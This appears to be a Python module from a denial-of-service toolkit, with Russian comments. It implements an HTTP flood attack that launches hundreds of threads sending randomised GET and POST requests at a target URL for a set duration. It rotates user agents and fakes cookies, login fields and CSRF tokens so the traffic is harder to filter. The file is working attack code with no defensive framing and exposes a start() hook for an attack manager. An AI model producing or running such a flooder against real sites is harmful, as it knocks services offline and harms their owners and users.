import os
import sys
import time
import random
import threading
import socket
import ssl
from concurrent.futures import ThreadPoolExecutor
from core.utils import Colors
import requests

class HTTPFlood:
    def __init__(self):
        self.stop_event = threading.Event()
        self.user_agents = self.load_user_agents()
        self.session = requests.Session()
        self.session.headers.update({'Connection': 'keep-alive'})
        
    def load_user_agents(self):
        """Загружает список User-Agent'ов из файла или использует встроенный"""
        try:
            with open('user_agents.txt', 'r') as f:
                return [line.strip() for line in f]
        except:
            return [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36"
            ]
    
    def create_session(self):
        """Создает новую сессию с рандомными параметрами"""
        session = requests.Session()
        
        # Случайный User-Agent
        session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        })
        
        # Рандомные куки
        session.cookies.update({
            'session_id': str(random.randint(1000000, 9999999)),
            'user_token': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16))
        })
        
        return session
    
    def send_request(self, url):
        """Отправляет HTTP-запрос к цели"""
        try:
            session = self.create_session()
            
            # Выбор случайного метода
            method = random.choice(['GET', 'POST']) if random.random() > 0.7 else 'GET'
            
            if method == 'GET':
                # Добавляем случайные параметры в URL
                params = {'rand': str(random.randint(1, 100000))}
                session.get(url, params=params, timeout=5)
            else:
                # Случайные данные для POST
                data = {
                    'username': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)),
                    'password': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=12)),
                    'csrf_token': ''.join(random.choices('abcdef0123456789', k=32))
                }
                session.post(url, data=data, timeout=5)
                
        except:
            pass
    
    def start(self, target, power, duration, stop_event):
        """Запускает HTTP-флуд атаку"""
        self.stop_event = stop_event
        threads = power * 100
        
        # Проверка и нормализация URL
        if not target.startswith('http'):
            target = 'http://' + target
        
        print(f"{Colors.RED}[+] Starting HTTP Flood: {target} (Threads: {threads}){Colors.RESET}")
        
        # Используем ThreadPoolExecutor для эффективного управления потоками
        with ThreadPoolExecutor(max_workers=threads) as executor:
            start_time = time.time()
            
            # Основной цикл атаки
            while not stop_event.is_set() and time.time() - start_time < duration:
                try:
                    # Отправляем пакет запросов
                    for _ in range(threads // 2):
                        executor.submit(self.send_request, target)
                    
                    # Краткая пауза
                    time.sleep(0.1)
                except KeyboardInterrupt:
                    stop_event.set()
                    break
                except Exception as e:
                    print(f"{Colors.RED}[-] Error: {str(e)}{Colors.RESET}")
        
        print(f"{Colors.GREEN}[✓] HTTP Flood stopped{Colors.RESET}")

# Интерфейс для AttackManager
def start(target, power, duration, stop_event):
    flood = HTTPFlood()
    flood.start(target, power, duration, stop_event)